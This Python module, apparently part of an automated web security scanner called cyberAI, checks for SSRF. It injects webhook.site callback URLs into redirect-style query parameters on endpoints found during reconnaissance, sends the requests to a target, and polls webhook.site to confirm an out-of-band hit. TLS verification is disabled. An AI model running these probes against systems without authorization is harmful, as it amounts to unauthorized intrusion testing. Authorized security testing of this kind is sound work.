"""
Out-of-band SSRF confirmation: if WEBHOOK_SITE_UUID is set, inject callback URL into
redirect-like endpoints and poll webhook.site for inbound HTTP from the target.
Target-agnostic (discovers redirect/query patterns from recon).
"""

from __future__ import annotations

import asyncio
import json
import uuid
from typing import Optional
from urllib.parse import parse_qs, quote, urlencode, urlparse, urlunparse

import httpx
from loguru import logger

from cyberAI.config import get_config
from cyberAI.models import (
    Finding,
    HttpMethod,
    ImpactType,
    ReproductionStep,
    RequestRecord,
    Severity,
    TestCategory,
)
from cyberAI.utils.helpers import load_json


_REDIRECT_KEYS = ("to", "url", "redirect", "next", "dest", "target", "return", "redirect_uri", "returnurl")
_POLL_URLS = (
    "https://webhook.site/token/{token}/requests",
    "https://webhook.site/api/v1/token/{token}/requests",
)


async def _poll_webhook(inbox_token: str, probe: str, timeout: float) -> Optional[dict]:
    """Poll webhook.site until a request mentioning ``probe`` appears."""
    loop = asyncio.get_running_loop()
    deadline = loop.time() + timeout
    async with httpx.AsyncClient(timeout=15.0, verify=False) as client:
        while loop.time() < deadline:
            for tmpl in _POLL_URLS:
                url = tmpl.format(token=inbox_token)
                try:
                    r = await client.get(url)
                    if r.status_code != 200:
                        continue
                    data = r.json()
                    rows = data if isinstance(data, list) else data.get("data", []) if isinstance(data, dict) else []
                    for h in rows:
                        blob = json.dumps(h, default=str)
                        if probe in blob:
                            return h if isinstance(h, dict) else {"raw": h}
                except Exception:
                    continue
            await asyncio.sleep(2.0)
    return None


def _urls_with_callback(base: str, endpoints: list, inbox_token: str) -> list[tuple[str, str]]:
    """
    Build (full_url, probe) pairs: redirect parameters point at https://webhook.site/{inbox}?probe=...
    """
    base = base.rstrip("/")
    out: list[tuple[str, str]] = []

    for ep in endpoints[:100]:
        if not isinstance(ep, dict):
            continue
        raw = (ep.get("url") or "").strip()
        if not raw:
            continue
        low = raw.lower()
        if "redirect" not in low and "to=" not in low and "url=" not in low and "next=" not in low:
            continue

        probe = uuid.uuid4().hex[:10]
        cb = f"https://webhook.site/{inbox_token}?probe={probe}"
        cb_enc = quote(cb, safe="")

        try:
            parsed = urlparse(raw if raw.startswith("http") else f"https://placeholder{raw}")
            if not parsed.netloc and raw.startswith("/"):
                parsed = urlparse(base + raw)
            qs = parse_qs(parsed.query, keep_blank_values=True)
            changed = False
            for key in list(qs.keys()):
                lk = key.lower()
                if lk in _REDIRECT_KEYS or "redirect" in lk:
                    qs[key] = [cb]
                    changed = True
            if not changed and qs:
                k0 = next(iter(qs.keys()))
                qs[k0] = [cb]
                changed = True
            if not changed:
                qs["to"] = [cb]
            new_query = urlencode({k: v[0] for k, v in qs.items()}, doseq=True)
            full = urlunparse(
                (
                    parsed.scheme or urlparse(base).scheme or "https",
                    parsed.netloc or urlparse(base).netloc,
                    parsed.path,
                    parsed.params,
                    new_query,
                    parsed.fragment,
                )
            )
            if not full.startswith("http"):
                full = base + "/" + full.lstrip("/")
            out.append((full, probe))
        except Exception:
            continue

    # Fallback: common redirect paths (any target may implement similar routes)
    for path in ("/redirect", "/api/redirect"):
        probe = uuid.uuid4().hex[:10]
        cb = f"https://webhook.site/{inbox_token}?probe={probe}"
        full = f"{base}{path}?to={quote(cb, safe='')}"
        out.append((full, probe))

    seen = set()
    uniq: list[tuple[str, str]] = []
    for u, p in out:
        if u not in seen:
            seen.add(u)
            uniq.append((u, p))
    return uniq[:12]


async def run_ssrf_oob_tests(run_id: Optional[str] = None) -> list[Finding]:
    config = get_config()
    inbox = (config.webhook_site_uuid or "").strip()
    if not inbox:
        logger.info("ssrf_oob: no WEBHOOK_SITE_UUID — skipping OOB SSRF probes")
        return []

    base = (config.target_url or "").rstrip("/")
    if not base:
        return []

    inv = load_json(config.get_output_path("recon", "intelligence", "endpoint_inventory.json")) or {}
    endpoints = inv.get("endpoints") if isinstance(inv, dict) else []
    if not endpoints:
        mi = load_json(config.get_output_path("recon", "intelligence", "master_intel.json")) or {}
        endpoints = mi.get("endpoints") or []

    pairs = _urls_with_callback(base, endpoints, inbox)
    findings: list[Finding] = []
    timeout = float(config.oob_poll_timeout_seconds or 35.0)

    async with httpx.AsyncClient(timeout=25.0, verify=False, follow_redirects=False) as client:
        for url, probe in pairs:
            try:
                r = await client.get(url)
                rec = RequestRecord(
                    method=HttpMethod.GET,
                    url=url,
                    headers={},
                    response_status=r.status_code,
                    response_headers=dict(r.headers),
                    response_body=(r.text or "")[:2000],
                    response_body_preview=(r.text or "")[:200],
                )
            except Exception as e:
                logger.debug(f"ssrf_oob request {e}")
                continue

            hit = await _poll_webhook(inbox, probe, min(timeout, 30.0))
            if hit:
                findings.append(
                    Finding(
                        title=f"[Confirmed] OOB HTTP callback (SSRF) probe={probe}",
                        severity=Severity.CRITICAL,
                        category=TestCategory.SSRF_OOB,
                        asset=url,
                        reproduction_steps=[
                            ReproductionStep(
                                step_number=1,
                                action=f"GET {url}",
                                actual_result=f"HTTP {r.status_code}; webhook saw probe {probe}",
                            )
                        ],
                        reliability_score=92.0,
                        root_cause="Outbound HTTP to attacker-controlled URL (OOB confirmed)",
                        request_proof=rec,
                        response_proof="webhook.site recorded inbound request matching probe",
                        impact_types=[ImpactType.CONFIDENTIALITY, ImpactType.INTEGRITY],
                        cwe_id="CWE-918",
                        raw_evidence={
                            "confirmation_method": "oob_http_callback",
                            "oob_provider": "webhook.site",
                            "probe": probe,
                            "hit_preview": str(hit)[:1500],
                        },
                    )
                )
                logger.warning(f"ssrf_oob: OOB confirmed for probe {probe}")
            await asyncio.sleep(config.request_delay_ms / 1000)

    logger.info(f"ssrf_oob: {len(findings)} confirmed OOB findings")
    return findings
